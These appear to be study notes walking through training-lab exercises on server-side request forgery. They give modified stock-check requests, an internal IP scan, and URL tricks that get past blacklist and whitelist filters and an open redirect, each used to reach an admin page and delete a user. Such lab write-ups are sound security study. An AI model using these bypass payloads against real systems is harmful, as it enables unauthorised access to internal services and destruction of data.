## Lab - 1: Basic SSRF against the local server (A)

- This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

- change the `stockApi` value to `http://localhost/admin/` and return a page that contains a link to delete the user carlos

- `http://localhost/admin/delete?username=carlos`

```
POST /product/stock HTTP/1.1
...
stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete%3fusername%3dcarlos
```

---

## Lab - 2: Basic SSRF against another back-end system (A)

- This lab has a stock check feature which fetches data from an internal system. To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

- the SSRF vuln end point is at

```
POST /product/stock HTTP/1.1
...
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

- change the IP `192.168.0.2:8080/admin` and return 500 error.
- in Burp Intruder use sniper from `2 to 256` at `192.168.0.x:8080/admin`
- found one number with 200 response
- then go on

---

## Lab - 3: SSRF with blacklist-based input filter (P)

- This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

- the SSRF vuln end point is at

```
POST /product/stock HTTP/1.1
...
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

- change the stockApi value to
- `http://localhost`, `http://127.0.0.1` => blocked
- found that `http://127.1` returns 200 but `http://127.1/admin` is blocked
- then make URL encoded to`admin` and use `http://127.1/%61%64%6d%69%6e`
- then go on

---

## Lab - 4: SSRF with whitelist-based input filter (E)

- This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed an anti-SSRF defense you will need to bypass.

- at the SSRF vuln end point,
- try to change the value of stockApi value
- `http://localhost` and return 400 response with "External stock check host must be stock.weliketoshop.net"
- try
  - `http://stock.weliketoshop.net@localhost`
  - `http://localhost#stock.weliketoshop.net`
  - `http://stock.weliketoshop.net.localhost`  
    not working
- `http://localhost@stock.weliketoshop.net` => get 500 server error
- `http://localhost#@stock.weliketoshop.net` not working
- `http://localhost%23@stock.weliketoshop.net` works again
- `http://localhost%23@stock.weliketoshop.net/admin` works
- `http://localhost:80%23@stock.weliketoshop.net/admin/delete?username=carlos`

---

## Lab - 5: SSRF with filter bypass via open redirection vulnerability (P)

- This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

- first find the Open redirect vuln
- Redirection is found at `Next Product` button
- Open redirect is found

```
GET /product/nextProduct?currentProductId=1&path=http://example.com HTTP/1.1
```

- then change the stockApi POST request to

```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---

## Lab - 6: Blind SSRF with out-of-band detection (P)

- This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

- change the `Referer` header in one of the GET request page of a product to Burp Collaborator client

---

## Lab - 7: Blind SSRF with Shellshock exploitation (E)

- This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.
